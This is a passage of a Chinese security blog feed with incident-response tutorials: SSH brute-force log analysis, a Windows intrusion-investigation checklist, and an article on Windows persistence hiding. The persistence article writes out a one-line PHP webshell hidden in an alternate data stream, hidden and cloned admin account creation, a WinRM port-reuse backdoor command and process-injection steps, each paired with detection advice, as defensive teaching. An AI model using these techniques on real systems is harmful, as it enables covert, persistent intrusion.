class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">1、统计了下日志，发现大约有126254次登录失败的记录，确认服务器遭受暴力破解</span><br><span class="line"><span class="comment">[root@localhost ~]</span># grep -o <span class="string">&quot;Failed password&quot;</span> /var/log/secure|uniq -c</span><br><span class="line">     126254 Failed password</span><br><span class="line">     </span><br><span class="line">2、输出登录爆破的第一行和最后一行，确认爆破时间范围：</span><br><span class="line"><span class="comment">[root@localhost ~]</span># grep <span class="string">&quot;Failed password&quot;</span> /var/log/secure|head -1</span><br><span class="line">Jul  8 20:14:59 localhost sshd<span class="comment">[14323]</span>: Failed password for invalid user qwe from 111.13.xxx.xxx port 1503 ssh2</span><br><span class="line"><span class="comment">[root@localhost ~]</span># grep <span class="string">&quot;Failed password&quot;</span> /var/log/secure|tail -1</span><br><span class="line">Jul 10 12:37:21 localhost sshd<span class="comment">[2654]</span>: Failed password for root from 111.13.xxx.xxx port 13068 ssh2</span><br><span class="line"></span><br><span class="line">3、进一步定位有哪些IP在爆破？</span><br><span class="line"><span class="comment">[root@localhost ~]</span># grep <span class="string">&quot;Failed password&quot;</span> /var/log/secure|grep -E -o <span class="string">&quot;(25<span class="subst">[0-5]</span>|2<span class="subst">[0-4]</span><span class="subst">[0-9]</span>|<span class="subst">[01]</span>?<span class="subst">[0-9]</span><span class="subst">[0-9]</span>?)\.(25<span class="subst">[0-5]</span>|2<span class="subst">[0-4]</span><span class="subst">[0-9]</span>|<span class="subst">[01]</span>?<span class="subst">[0-9]</span><span class="subst">[0-9]</span>?)\.(25<span class="subst">[0-5]</span>|2<span class="subst">[0-4]</span><span class="subst">[0-9]</span>|<span class="subst">[01]</span>?<span class="subst">[0-9]</span><span class="subst">[0-9]</span>?)\.(25<span class="subst">[0-5]</span>|2<span class="subst">[0-4]</span><span class="subst">[0-9]</span>|<span class="subst">[01]</span>?<span class="subst">[0-9]</span><span class="subst">[0-9]</span>?)&quot;</span>|uniq -c | sort -nr </span><br><span class="line">    12622 23.91.xxx.xxx</span><br><span class="line">     8942 114.104.xxx.xxx</span><br><span class="line">     8122 111.13.xxx.xxx</span><br><span class="line">     7525 123.59.xxx.xxx</span><br><span class="line">     ...................</span><br><span class="line">    </span><br><span class="line">4、爆破用户名字典都有哪些？</span><br><span class="line"><span class="comment">[root@localhost ~]</span># grep <span class="string">&quot;Failed password&quot;</span> /var/log/secure|perl -e &#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print <span class="string">&quot;$1\n&quot;</span>;&#125;&#x27;|uniq -c|sort -nr</span><br><span class="line">      9402  root</span><br><span class="line">      3265  invalid user oracle</span><br><span class="line">      1245  invalid user admin</span><br><span class="line">      1025  invalid user user</span><br><span class="line">      .....................</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>C、管理员最近登录情况：</strong></p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、登录成功的日期、用户名、IP：</span><br><span class="line">[root<span class="meta">@localhost</span> ~]# grep <span class="string">&quot;Accepted &quot;</span> /<span class="keyword">var</span>/log/secure | awk <span class="string">&#x27;&#123;print <span class="subst">$1</span>,<span class="subst">$2</span>,<span class="subst">$3</span>,<span class="subst">$9</span>,<span class="subst">$11</span>&#125;&#x27;</span> </span><br><span class="line">Jul <span class="number">9</span> <span class="number">09</span>:<span class="number">38</span>:<span class="number">09</span> root <span class="number">192.168</span><span class="number">.143</span><span class="number">.100</span></span><br><span class="line">Jul <span class="number">9</span> <span class="number">14</span>:<span class="number">55</span>:<span class="number">51</span> root <span class="number">192.168</span><span class="number">.143</span><span class="number">.100</span></span><br><span class="line">Jul <span class="number">10</span> <span class="number">08</span>:<span class="number">54</span>:<span class="number">26</span> root <span class="number">192.168</span><span class="number">.143</span><span class="number">.100</span></span><br><span class="line">Jul <span class="number">10</span> <span class="number">16</span>:<span class="number">25</span>:<span class="number">59</span> root <span class="number">192.168</span><span class="number">.143</span><span class="number">.100</span></span><br><span class="line">............................</span><br><span class="line">通过登录日志分析，并未发现异常登录时间和登录IP。</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、顺便统计一下登录成功的IP有哪些：</span><br><span class="line">[root<span class="meta">@localhost</span> ~]# grep <span class="string">&quot;Accepted &quot;</span> /<span class="keyword">var</span>/log/secure | awk <span class="string">&#x27;&#123;print <span class="subst">$11</span>&#125;&#x27;</span> | sort | uniq -c | sort -nr | more</span><br><span class="line">     <span class="number">27</span> <span class="number">192.168</span><span class="number">.204</span><span class="number">.1</span></span><br></pre></td></tr></table></figure><p>通过日志分析，发现攻击者使用了大量的用户名进行暴力破解，但从近段时间的系统管理员登录记录来看，并未发现异常登录的情况，需要进一步对网站服务器进行入侵排查，这里就不再阐述。</p><h3 id="0x04-处理措施"><a href="#0x04-处理措施" class="headerlink" title="0x04 处理措施"></a>0x04 处理措施</h3><p>​    SSH暴力破解依然十分普遍，如何保护服务器不受暴力破解攻击，总结了几种措施：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>、禁止向公网开放管理端口，若必须开放应限定管理IP地址并加强口令安全审计（口令长度不低于<span class="number">8</span>位，由数字、大小写字母、特殊字符等至少两种以上组合构成）。</span><br><span class="line"><span class="attribute">2</span>、更改服务器ssh默认端口。</span><br><span class="line"><span class="attribute">3</span>、部署入侵检测设备，增强安全防护。</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">学习应急响应咯!</summary>
    
    
    
    <category term="渗透测试" scheme="https://github.com/Eviden0/new-webpage/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="应急响应" scheme="https://github.com/Eviden0/new-webpage/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>第01章：入侵排查篇第1篇：Windows 入侵排查</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/dd41cd94.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/dd41cd94.html</id>
    <published>2024-06-13T05:10:00.000Z</published>
    <updated>2024-06-13T05:57:09.034Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第1篇：windows-入侵排查"><a href="#第1篇：windows-入侵排查" class="headerlink" title="第1篇：windows 入侵排查"></a>第1篇：windows 入侵排查</h2><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。  </p><p>常见的应急响应事件分类：</p><p>Web 入侵：网页挂马、主页篡改、Webshell</p><p>系统入侵：病毒木马、勒索软件、远控后门</p><p>网络攻击：DDOS 攻击、DNS 劫持、ARP 欺骗</p><p>针对常见的攻击事件，结合工作中应急响应事件分析和解决的方法，总结了一些 Windows 服务器入侵排查的思路。</p><h3 id="0x01-入侵排查思路"><a href="#0x01-入侵排查思路" class="headerlink" title="0x01 入侵排查思路"></a>0x01 入侵排查思路</h3><h4 id="1-1-检查系统账号安全"><a href="#1-1-检查系统账号安全" class="headerlink" title="1.1 检查系统账号安全"></a>1.1 检查系统账号安全</h4><p>1、查看服务器是否有弱口令，远程管理端口是否对公网开放。</p><ul><li>检查方法：据实际情况咨询相关服务器管理员。</li></ul><p>2、查看服务器是否存在可疑账号、新增账号。</p><ul><li>检查方法：打开 cmd 窗口，输入 <code>lusrmgr.msc</code> 命令，查看是否有新增/可疑的账号，如有管理员群组的（Administrators）里的新增账户，如有，请立即禁用或删除掉。 </li></ul><p>3、查看服务器是否存在隐藏账号、克隆账号。</p><ul><li><p>检查方法：</p><p>a、打开注册表 ，查看管理员对应键值。</p><p>b、使用D盾_web查杀工具，集成了对克隆账号检测的功能。</p></li></ul><p><img src="https://gitee.com/eviden/img/raw/master/sum-1-1.png" alt=""></p><p>4、结合日志，查看管理员登录时间、用户名是否存在异常。</p><ul><li><p>检查方法：</p><p>a、Win+R 打开运行，输入”eventvwr.msc”，回车运行，打开“事件查看器”。</p><p>b、导出 Windows 日志 — 安全，利用微软官方工具 <a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">Log Parser</a> 进行分析。</p></li></ul><p><img src="https://gitee.com/eviden/img/raw/master/sum-1-2.png" alt=""></p><h4 id="1-2-检查异常端口、进程"><a href="#1-2-检查异常端口、进程" class="headerlink" title="1.2 检查异常端口、进程"></a>1.2 检查异常端口、进程</h4><p>1、检查端口连接情况，是否有远程连接、可疑连接。</p><ul><li><p>检查方法：</p><p>a、使用<code>netstat -ano</code> 命令查看目前的网络连接，定位可疑的 ESTABLISHED </p><p>b、根据 netstat 命令定位出的 PID 编号，再通过 tasklist 命令进行进程定位 <code>tasklist  | findstr &quot;PID&quot;</code></p></li></ul><p><img src="https://gitee.com/eviden/img/raw/master/sum-1-3.png" alt=""></p><p>2、进程</p><ul><li><p>检查方法：</p><p>a、开始 — 运行 — 输入 <code>msinfo32</code> 命令，依次点击 “软件环境 — 正在运行任务” 就可以查看到进程的详细信息，比如进程路径、进程ID、文件创建日期以及启动时间等。</p><p>b、打开D盾_web查杀工具，进程查看，关注没有签名信息的进程。</p><p>c、通过微软官方提供的 Process Explorer 等工具进行排查 。</p><p>d、查看可疑的进程及其子进程。可以通过观察以下内容：</p><pre><code>  没有签名验证信息的进程  没有描述信息的进程  进程的属主  进程的路径是否合法  CPU 或内存资源占用长时间过高的进程</code></pre></li></ul><p>3、小技巧：</p><p>​    a、查看端口对应的 PID：<code>netstat -ano | findstr &quot;port&quot;</code></p><p>​    b、查看进程对应的 PID：任务管理器 — 查看 — 选择列 — PID 或者 <code>tasklist  | findstr &quot;PID&quot;</code></p><p>​    c、查看进程对应的程序位置：</p><p>​        任务管理器 — 选择对应进程 — 右键打开文件位置</p><p>​        运行输入 <code>wmic</code>，cmd 界面输入 <code>process</code></p><p>​    d、<code>tasklist /svc</code>   进程 — PID — 服务</p><p>​    e、查看Windows服务所对应的端口：</p><p>​        %systemroot%/system32/drivers/etc/services（一般 %systemroot% 就是 C:\Windows 路径）</p><h4 id="1-3-检查启动项、计划任务、服务"><a href="#1-3-检查启动项、计划任务、服务" class="headerlink" title="1.3 检查启动项、计划任务、服务"></a>1.3 检查启动项、计划任务、服务</h4><p>1、检查服务器是否有异常的启动项。</p><ul><li><p>检查方法：</p><p>a、登录服务器，单击【开始】&gt;【所有程序】&gt;【启动】，默认情况下此目录在是一个空目录，确认是否有非业务程序在该目录下。<br>b、单击开始菜单 &gt;【运行】，输入 <code>msconfig</code>，查看是否存在命名异常的启动项目，是则取消勾选命名异常的启动项目，并到命令中显示的路径删除文件。<br>c、单击【开始】&gt;【运行】，输入 regedit，打开注册表，查看开机启动项是否正常，特别注意如下三个注册表项：</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\run</span><br><span class="line">  HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce</span><br></pre></td></tr></table></figure><p>检查右侧是否有启动异常的项目，如有请删除，并建议安装杀毒软件进行病毒查杀，清除残留病毒或木马。</p><p>d、利用安全软件查看启动项、开机时间管理等。</p><p>e、组策略，运行 <code>gpedit.msc</code></p></li></ul><p><img src="https://gitee.com/eviden/img/raw/master/sum-1-4.png" alt=""></p><p>2、检查计划任务</p><ul><li><p>检查方法：</p><p>a、单击【开始】&gt;【设置】&gt;【控制面板】&gt;【任务计划】，查看计划任务属性，便可以发现木马文件的路径。</p><p>b、单击【开始】&gt;【运行】；输入 <code>cmd</code>，然后输入 <code>at</code>，检查计算机与网络上的其它计算机之间的会话或计划任务，如有，则确认是否为正常连接。</p></li></ul><p>3、服务自启动</p><ul><li>检查方法：单击【开始】&gt;【运行】，输入 <code>services.msc</code>，注意服务状态和启动类型，检查是否有异常服务。</li></ul><h4 id="1-4-检查系统相关信息"><a href="#1-4-检查系统相关信息" class="headerlink" title="1.4 检查系统相关信息"></a>1.4 检查系统相关信息</h4><p>1、查看系统版本以及补丁信息</p><ul><li>检查方法：单击【开始】&gt;【运行】，输入 <code>systeminfo</code>，查看系统信息。</li></ul><p>2、查找可疑目录及文件</p><ul><li><p>检查方法：</p><p>a、 查看用户目录，新建账号会在这个目录生成一个用户目录，查看是否有新建用户目录。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Window</span> <span class="number">2003</span>版本 C:\Documents and Settings</span><br><span class="line">  <span class="attribute">Window</span> <span class="number">2008</span>R2及以后版本 C:\Users\</span><br></pre></td></tr></table></figure><p>b、单击【开始】&gt;【运行】，输入 <code>%UserProfile%\Recent</code>，分析最近打开分析可疑文件。</p><p>c、在服务器各个目录，可根据文件夹内文件列表时间进行排序，查找可疑文件。</p><p>d、回收站、浏览器下载目录、浏览器历史记录</p><p>e、修改时间在创建时间之前的为可疑文件</p></li></ul><p>3、发现并得到 WebShell、远控木马的创建时间，如何找出同一时间范围内创建的文件？</p><p>a、利用 <a href="http://www.torchsoft.com/en/rw_information.html">Registry Workshop</a> 注册表编辑器的搜索功能，可以找到最后写入时间区间的文件。<br>b、利用计算机自带文件搜索功能，指定修改时间进行搜索。</p><h4 id="1-5-自动化查杀"><a href="#1-5-自动化查杀" class="headerlink" title="1.5 自动化查杀"></a>1.5 自动化查杀</h4><ul><li><p>病毒查杀</p><ul><li>检查方法：下载安全软件，更新最新病毒库，进行全盘扫描。</li></ul></li><li><p>webshell查杀</p><ul><li>检查方法：选择具体站点路径进行webshell查杀，建议使用两款 WebShell 查杀工具同时查杀，可相互补充规则库的不足。</li></ul></li></ul><h4 id="1-6-日志分析"><a href="#1-6-日志分析" class="headerlink" title="1.6 日志分析"></a>1.6 日志分析</h4><p>系统日志</p><ul><li><p>分析方法：</p><p>a、前提：开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。</p><p>b、Win+R 打开运行，输入 “eventvwr.msc”，回车运行，打开”事件查看器”。</p><p>C、导出应用程序日志、安全日志、系统日志，利用 <a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">Log Parser</a> 进行分析。</p></li></ul><p>Web 访问日志</p><ul><li><p>分析方法：</p><p>a、找到中间件的web日志，打包到本地方便进行分析。</p><p>b、推荐工具：Windows 下，推荐用 EmEditor 进行日志分析，支持大文本，搜索效率还不错。Linux 下，使用 Shell 命令组合查询分析。</p></li></ul><h3 id="0x02-工具篇"><a href="#0x02-工具篇" class="headerlink" title="0x02 工具篇"></a>0x02 工具篇</h3><h4 id="2-1-病毒分析"><a href="#2-1-病毒分析" class="headerlink" title="2.1 病毒分析"></a>2.1 病毒分析</h4><p>PCHunter：<a href="http://www.xuetr.com">http://www.xuetr.com</a></p><p>火绒剑：<a href="https://www.huorong.cn">https://www.huorong.cn</a></p><p>Process Explorer：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer">https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer</a></p><p>processhacker：<a href="https://processhacker.sourceforge.io/downloads.php">https://processhacker.sourceforge.io/downloads.php</a></p><p>autoruns：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns">https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns</a></p><p>OTL：<a href="https://www.bleepingcomputer.com/download/otl/">https://www.bleepingcomputer.com/download/otl/</a></p><p>SysInspector：<a href="http://download.eset.com.cn/download/detail/?product=sysinspector">http://download.eset.com.cn/download/detail/?product=sysinspector</a></p><h4 id="2-2-病毒查杀"><a href="#2-2-病毒查杀" class="headerlink" title="2.2 病毒查杀"></a>2.2 病毒查杀</h4><p>卡巴斯基：<a href="http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe">http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe</a>   （推荐理由：绿色版、最新病毒库）</p><p>大蜘蛛：<a href="http://free.drweb.ru/download+cureit+free（推荐理由：扫描快、一次下载只能用1周，更新病毒库）">http://free.drweb.ru/download+cureit+free（推荐理由：扫描快、一次下载只能用1周，更新病毒库）</a></p><p>火绒安全软件：<a href="https://www.huorong.cn">https://www.huorong.cn</a></p><p>360杀毒：<a href="http://sd.360.cn/download_center.html">http://sd.360.cn/download_center.html</a></p><h4 id="2-3-病毒动态"><a href="#2-3-病毒动态" class="headerlink" title="2.3 病毒动态"></a>2.3 病毒动态</h4><p>CVERC-国家计算机病毒应急处理中心：<a href="http://www.cverc.org.cn">http://www.cverc.org.cn</a></p><p>微步在线威胁情报社区：<a href="https://x.threatbook.cn">https://x.threatbook.cn</a></p><p>火绒安全论坛：<a href="http://bbs.huorong.cn/forum-59-1.html">http://bbs.huorong.cn/forum-59-1.html</a></p><p>爱毒霸社区：<a href="http://bbs.duba.net">http://bbs.duba.net</a></p><p>腾讯电脑管家：<a href="http://bbs.guanjia.qq.com/forum-2-1.html">http://bbs.guanjia.qq.com/forum-2-1.html</a></p><h4 id="2-4-在线病毒扫描网站"><a href="#2-4-在线病毒扫描网站" class="headerlink" title="2.4 在线病毒扫描网站"></a>2.4 在线病毒扫描网站</h4><p>Virustotal：<a href="https://www.virustotal.com">https://www.virustotal.com</a></p><p>Virscan：<a href="http://www.virscan.org">http://www.virscan.org</a></p><p>腾讯哈勃分析系统：<a href="https://habo.qq.com">https://habo.qq.com</a></p><p>Jotti 恶意软件扫描系统：<a href="https://virusscan.jotti.org">https://virusscan.jotti.org</a></p><h4 id="2-5-webshell查杀"><a href="#2-5-webshell查杀" class="headerlink" title="2.5 webshell查杀"></a>2.5 webshell查杀</h4><p>D盾_Web查杀：<a href="http://www.d99net.net/index.asp">http://www.d99net.net/index.asp</a></p><p>河马 WebShell 查杀：<a href="http://www.shellpub.com">http://www.shellpub.com</a></p>]]></content>
    
    
    <summary type="html">学习应急响应咯!</summary>
    
    
    
    <category term="渗透测试" scheme="https://github.com/Eviden0/new-webpage/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="应急响应" scheme="https://github.com/Eviden0/new-webpage/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>第03章：权限维持篇第1篇：Windows权限维持--隐藏篇</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/143d02f0.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/143d02f0.html</id>
    <published>2024-06-13T05:10:00.000Z</published>
    <updated>2024-06-13T05:57:09.045Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>攻击者在获取服务器权限后，通常会用一些后门来维持权限，如果你想让你的后门保持的更久些，那么请隐藏好它，使之不易被管理员发现。</p><h3 id="0x01-隐藏文件"><a href="#0x01-隐藏文件" class="headerlink" title="0x01 隐藏文件"></a>0x01 隐藏文件</h3><p><strong>1、利用文件属性</strong></p><p>最简单的一种隐藏文件的方式，文件右键属性，勾选隐藏，点击确定后，在这个文件里看不到刚刚的文件了。</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-1.png" alt=""></p><p>如果要让文件显示出来，就点击查看，勾选显示隐藏的文件，文件就显示出来。</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-2.png" alt=""></p><p>如何真正隐藏文件？</p><p>使用Attrib +s +a +h +r命令就是把原本的文件夹增加了系统文件属性、存档文件属性、只读文件属性和隐藏文件属性。</p><p><code>attrib +s +a +h +r  D:\test\project\test</code>.txt</p><p>这样就做到了真正的隐藏，不管你是否显示隐藏文件，此文件夹都看不见。</p><p>破解隐藏文件：</p><p>打开电脑文件夹选项卡，取消”隐藏受保护的操作系统文件“勾选，把”隐藏文件和文件夹“下面的单选选择“显示隐藏的文件、文件夹和驱动器”。</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-3.png" alt=""></p><p><strong>2、利用ADS隐藏文件内容</strong></p><p>​    在服务器上echo一个数据流文件进去，比如index.php是网页正常文件，我们可以这样子搞： 　</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> ^<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;chopper&#x27;</span>]);?^&gt; &gt; index.php:hidden.jpg</span><br></pre></td></tr></table></figure><p>这样子就生成了一个不可见的shell hidden.jpg，常规的文件管理器、type命令，dir命令、del命令发现都找不出那个hidden.jpg的。　</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">问题<span class="number">1</span>：如何查看index<span class="selector-class">.php</span>:hidden.jpg内容呢？</span><br><span class="line"></span><br><span class="line">　　进入文件所在目录，notepad index<span class="selector-class">.php</span>:hidden<span class="selector-class">.jpg</span>    或者 dir /<span class="attribute">r</span></span><br><span class="line">　　</span><br><span class="line">问题<span class="number">2</span>：如何删除index<span class="selector-class">.php</span>:hidden.jpg？</span><br><span class="line"></span><br><span class="line">     直接删除index.php即可</span><br></pre></td></tr></table></figure><p><strong>3、驱动级文件隐藏</strong></p><p>驱动隐藏我们可以用过一些软件来实现，软件名字叫：Easy File Locker      </p><p>下载链接： <a href="http://www.xoslab.com/efl.html">http://www.xoslab.com/efl.html</a></p><p>如果你在网站目录未查找到相关文件，且系统目录存在存在以下文件：</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="name">c</span>:\WINDOWS\xlkfs.dat</span><br><span class="line"><span class="name">c</span>:\WINDOWS\xlkfs.dll</span><br><span class="line"><span class="name">c</span>:\WINDOWS\xlkfs.ini</span><br><span class="line"><span class="name">c</span>:\WINDOWS\system32\drivers\xlkfs.sys</span><br></pre></td></tr></table></figure><p>那么你，应该是遭遇了驱动级文件隐藏。</p><p>如何清除？</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、查询服务状态： <span class="keyword">sc</span> qc xlkfs</span><br><span class="line">2、停止服务： <span class="keyword">net</span> stop xlkfs 服务停止以后，经驱动级隐藏的文件即可显现</span><br><span class="line">3、删除服务： <span class="keyword">sc</span> delete xlkfs</span><br><span class="line">4、删除系统目录下面的文件，重启系统，确认服务已经被清理了。</span><br></pre></td></tr></table></figure><p>隐藏文件的方式还有很多，比如伪装成一个系统文件夹图标，利用畸形文件名、保留文件名无法删除，甚至取一个与系统文件很像的文件名并放在正常目录里面，很难辨别出来。</p><p>这些隐藏文件的方式早已不再是秘密，而更多的恶意程序开始实现“无文件”攻击，这种方式极难被发现。</p><h3 id="0x02-隐藏账号"><a href="#0x02-隐藏账号" class="headerlink" title="0x02 隐藏账号"></a>0x02 隐藏账号</h3><p>window 隐藏系统用户操作，CMD命令行下，建立了一个用户名为“test$”，密码为“abc123!”的简单隐藏账户,并且把该隐藏账户提升为了管理员权限。</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-4.png" alt=""></p><p>PS:CMD命令行使用”net user”,看不到”test$”这个账号，但在控制面板和本地用户和组是可以显示此用户的。</p><p>克隆账号制作过程：</p><p>1、“开始”→“运行”，输入“regedt32.exe”后回车,需要到“HKEY_LOCAL_MACHINE\SAM\SAM”，单机右建权限，把名叫：administrator的用户给予：完全控制以及读取的权限，在后面打勾就行，然后关闭注册表编辑器，再次打开即可。</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-5.png" alt=""></p><p>2、来到注册表编辑器的“HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names”处，点击test$用户，得到在右边显示的键值中的“类型”一项显示为0x3ec，找到箭头所指目录。</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-6.png" alt=""></p><p>3、找到administrator所对应的的项为“000001F4”，将“000001F4”的F值复制到“000003EC”的F值中，保存。</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-7.png" alt=""></p><p>4、分别test$和“000003EC导出到桌面，删除test$用户   net user test$ /del</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-8.png" alt=""></p><p>5、将刚才导出的两个后缀为.reg的注册表项导入注册表中。这样所谓的隐藏账户就创建好了。PS：不管你是在命令提示符下输入net user 或者在系统用户管理界面都是看不到test$这个账户的，只有在注册表中才能看得到。</p><p>检测和清理方法：</p><p>使用D盾_web查杀工具，使用克隆账号检测功能进行查看，可检测出隐藏、克隆账号。</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-9.png" alt=""></p><h3 id="0x03-端口复用"><a href="#0x03-端口复用" class="headerlink" title="0x03 端口复用"></a>0x03 端口复用</h3><p>通过端口复用来达到隐藏端口的目的，在Window下，如何实现端口复用呢？</p><p>前阵子，@Twi1ight公布了一种基于内置系统服务的端口复用后门方法，利用WinRM服务，一条命令实现端口复用后门：</p><p><code>winrm set winrm/config/service @&#123;EnableCompatibilityHttpListener=&quot;true&quot;&#125;</code></p><p>一般开启WinRM服务作为远程管理，但还是第一次听到可以作为端口复用，一种简单容易实现的端口复用方式。假设，攻击者已获取到administrator账号密码，连接远程WinRM服务执行命令：</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-19.png" alt=""></p><p>当执行这条命令的同时，将在安全日志中留下痕迹，</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-20.png" alt=""></p><p>另外，可以通过代码实现端口复用重定向，工具：<a href="https://github.com/crabkun/Switcher">https://github.com/crabkun/Switcher</a></p><h3 id="0x04-进程注入"><a href="#0x04-进程注入" class="headerlink" title="0x04 进程注入"></a>0x04 进程注入</h3><p>进程注入，一直是病毒木马的惯用手段，同时，它也是一种隐藏技术。在常见的渗透测试框架中，进程注入是怎么做的以及我们如何通过工具排查出来？</p><p><strong>1、meterpreter会话注入</strong></p><p>当前权限无法获取hash值，查看目前系统进程</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-10.png" alt=""></p><p>通过migrate将进程注入到system进程后，成功获得hash值。</p><p><img src="./image/privilege-1-11.png" alt=""></p><p>Window后门排查：</p><p>通过TCPview显示已建立的TCP连接，我们可以看到异常的连接，同时，恶意软件将以绿色显示不到一秒钟，然后变成红色消失，如此循环。 </p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-12.png" alt=""></p><p><strong>2、Empire会话进程注入</strong></p><p>通过psinject模块进行会话注入，直接输入ps选择一个SYSTEM权限的进程PID，使用进程注入模块，来获取权限。如下图：</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-13.png" alt=""></p><p>Window后门排查：利用process monitor或者火绒剑监控进程都可以定位到注入进程。</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-14.png" alt=""></p><p><img src="./image/privilege-1-15.png" alt=""></p><p><strong>3、Cobalt Strike进程注入</strong></p><p>选择进程，点击inject，随后选择监听器，点击choose，即可发现Cobaltstrike弹回了目标机的一个新会话，这个会话就是成功注入到某进程的beacon。</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-16.png" alt=""></p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-17.png" alt=""></p><p>Window后门排查：利用process monitor捕捉通信过程，有规律的请求取决于sleep设置的间隔。</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-18.png" alt=""></p><h3 id="0x05-结束"><a href="#0x05-结束" class="headerlink" title="0x05  结束"></a>0x05  结束</h3><p>本文主要介绍了Window下的几种隐藏技术，包括隐藏文件、隐藏账号、端口复用、进程注入等方面的简单实现及其排查技巧。仅作抛砖引玉之用，欢迎留言分享。</p>]]></content>
    
    
    <summary type="html">学习应急响应咯!</summary>
    
    
    
    <category term="渗透测试" scheme="https://github.com/Eviden0/new-webpage/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="应急响应" scheme="https://github.com/Eviden0/new-webpage/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>第02章：日志分析篇第1篇：Windows日志分析</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/68c6ad09.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/68c6ad09.html</id>
    <published>2024-06-13T05:10:00.000Z</published>
